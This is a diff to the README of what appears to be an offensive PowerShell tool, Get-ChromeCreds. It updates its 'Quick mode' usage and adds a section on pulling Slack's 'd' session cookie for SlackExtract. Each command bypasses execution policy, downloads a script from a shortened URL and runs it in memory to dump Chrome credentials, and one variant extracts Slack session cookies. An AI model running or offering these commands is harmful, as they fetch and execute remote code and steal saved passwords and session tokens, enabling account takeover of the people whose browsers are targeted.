@@ -19,6 +19,12 @@
 ## Quick mode...
 
 ```PowerShell
-  C:\> powershell -exec bypass -c "IEX((new-object net.webclient).downloadstring('https://bit.ly/2xQhUMu'))"
+  C:\> powershell -exec bypass -c "IEX((new-object net.webclient).downloadstring('https://bit.ly/2OMBArT'))Get-ChromeCreds"
+```
+
+## Just pull "d" Cookie for use with SlackExtract...
+
+```PowerShell
+  C:\> powershell -exec bypass -c "IEX((new-object net.webclient).downloadstring('https://bit.ly/2OMBArT'));Get-ChromeCreds -SlackExtract"
 ```
 
